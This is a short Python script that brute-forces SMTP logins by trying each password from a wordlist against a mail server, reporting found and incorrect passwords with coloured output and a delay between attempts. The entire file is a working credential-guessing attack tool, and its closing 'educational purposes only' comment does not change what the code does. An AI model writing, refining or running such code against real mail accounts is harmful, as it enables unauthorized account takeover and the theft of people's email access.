import smtplib
from time import sleep

# Define colors for output
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def smtp_bruteforce(address, username, wordlist, delay, port):
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                with smtplib.SMTP(address, port) as s:
                    s.ehlo()
                    s.starttls()
                    s.ehlo()  # Corrected from s.ehlo to s.ehlo()
                    s.login(username, password)
                    print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
                    break  # Exit loop after finding the correct password
            except smtplib.SMTPAuthenticationError:
                print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!\n{W}")
                sleep(delay)
            except Exception as e:
                print(f"{R}[!] Oops, something went wrong! Check if you have typed everything correctly, as well as the email address [!]{W}")
                print(f"[DEBUG] Exception: {e}")  # Debugging output
                break  # Exit loop on other errors to avoid infinite loop

# Note: This script is for educational purposes only.
